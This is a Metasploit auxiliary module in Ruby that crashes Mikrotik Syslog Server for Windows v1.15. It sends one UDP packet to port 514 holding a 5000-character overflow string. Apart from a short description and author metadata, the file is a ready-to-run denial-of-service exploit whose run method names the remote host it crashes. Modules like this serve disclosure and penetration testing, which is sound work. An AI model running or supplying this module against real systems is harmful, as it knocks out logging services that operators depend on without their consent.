require 'msf/core'
 
class Metasploit3 < Msf::Auxiliary
 
    include Msf::Exploit::Remote::Udp
    include Msf::Auxiliary::Dos
 
    def initialize
        super(
            'Name'        => 'Mikrotik Syslog Server for Windows - remote BOF DOS',
            'Description' => %q{
                    This module triggers the windows socket error WSAEMSGSIZE (message to long)
                                        in the Mikrotik Syslog Server for Windows v 1.15 and crashes it.
                                        The long syslog message overwrite the allocated buffer space causing the socket error.
                                           
            },
            'Author'      => 'xis_one@STM Solutions',
            'License'     => MSF_LICENSE,
            'DisclosureDate' => 'Apr 19 2013')
 
        register_options(
            [
                Opt::RPORT(514)
            ])
    end
 
    def run
        connect_udp
        pkt = "<0>" + "Apr19 " +  "10.0.0.2 " + "badass" + ": " + "A"*5000
        print_status("Crashing the remote Mikrotik syslog server #{rhost}")
        udp_sock.put(pkt)
        disconnect_udp
    end
end

